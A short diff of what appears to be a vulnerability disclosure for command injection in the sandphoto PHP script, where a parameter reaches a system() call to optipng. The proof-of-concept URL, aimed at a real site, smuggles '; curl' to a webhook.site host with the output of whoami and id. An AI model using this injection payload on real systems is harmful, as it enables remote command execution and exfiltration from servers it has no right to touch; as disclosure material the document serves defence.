@@ -14,7 +14,7 @@ system("/usr/bin/optipng " . $cachePath . " >/dev/null 2>/dev/null");
 ### PoC
 ![image](https://github.com/user-attachments/assets/707023f8-8c13-4c85-9d01-fa1a7e646a8a)
 
-URL : https://www.sandcomp.com/sandphoto/temp/preview-14-28-blue%20;%20curl%20https://webhook.site/c7cba25c-dc7b-4a19-be47-2ac1c3268450%20--data%20$(whoami%20;%20id).png
+URL : [https://www.sandcomp.com/sandphoto/temp/preview-14-28-blue%20;%20curl%20https://webhook.site/c7cba25c-dc7b-4a19-be47-2ac1c3268450%20--data%20$(whoami%20;%20id).png](https://www.sandcomp.com/sandphoto/preview.php?t=14&c=28&b=blue%20;%20curl%20https://webhook.site/c7cba25c-dc7b-4a19-be47-2ac1c3268450%20--data%20$(whoami%20;%20id))
 
 Result : 
 ![image](https://github.com/user-attachments/assets/8daf21b6-5f28-41f4-b8cc-407e73c7eeef)
